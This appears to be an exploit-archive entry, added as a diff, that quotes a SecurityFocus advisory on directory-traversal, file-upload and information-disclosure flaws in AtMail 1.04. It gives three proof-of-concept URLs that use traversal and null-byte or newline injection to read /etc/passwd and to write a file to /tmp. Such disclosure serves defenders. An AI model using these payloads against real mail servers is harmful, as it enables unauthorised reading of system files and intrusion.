@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/52684/info
+
+AtMail is prone to multiple directory-traversal vulnerabilities, an arbitrary-file-upload vulnerability, and an information-disclosure vulnerability because the application fails to sanitize user-supplied input.
+
+An attacker can exploit these issues to obtain sensitive information, upload arbitrary code, and run it in the context of the webserver process.
+
+Atmail 1.04 is vulnerable; other versions may also be affected. 
+
+https://www.example.com/compose.php?func=renameattach&unique=/..././..././..././..././..././..././..././..././..././..././..././..././tmp/positive.test%00&Attachment[]=/../../../../../../../../../etc/passwd
+
+https://www.example.com/compose.php?func=renameattach&unique=1.txt%00&Attachment[]=/../../../../../../../../../etc/passwd
+
+https://www.example.com/mime.php?file=%0A/../../../../../../../../../etc/passwd&name=positive.html 
